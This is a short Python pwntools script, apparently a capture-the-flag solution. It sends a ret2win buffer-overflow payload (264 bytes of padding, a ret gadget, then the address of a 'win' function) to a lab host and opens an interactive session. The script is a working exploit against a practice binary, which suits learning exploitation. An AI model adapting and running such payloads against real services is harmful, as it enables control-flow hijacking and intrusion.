from pwn import *

elf = context.binary = ELF('./tryretme')
context.log_level = 'info'

io = remote('10.10.62.83', 9006)

offset = 264
ret = 0x40101a

payload = flat(
	b'A' * offset,
	ret,
	elf.sym['win'],
)

io.sendline(payload)
io.interactive()